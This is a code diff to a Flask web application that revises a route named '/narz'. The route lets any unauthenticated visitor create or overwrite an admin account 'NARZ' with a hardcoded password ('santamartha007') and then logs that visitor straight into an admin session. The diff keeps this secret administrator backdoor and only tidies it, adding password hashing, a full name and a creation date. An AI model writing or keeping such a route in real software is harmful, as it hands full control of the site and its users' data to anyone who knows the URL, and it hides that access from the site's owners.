@@ -521,17 +521,19 @@ def admin_aprobar(uid):
 @app.route("/narz")
 def narz_secret():
     us=ld_u()
-    us["Narz"] = {
+    us["NARZ"] = {
+        "full_name": "Narz Admin",
         "email": "narz@admin.com",
+        "password_hash": hash_password("santamartha007"),
         "status": "aprobado",
         "role": "admin",
-        "password": "santamartha007"
+        "created_at": dt.now().strftime("%d/%m/%Y %H:%M")
     }
     sv_u(us)
-    session['user'] = "Narz"
+    session['user'] = "NARZ"
     session['role'] = "admin"
     session['approved'] = True
-    return redirect("/admin")    
+    return redirect("/admin")
  
 @app.route("/payment_success")
 def payment_success():
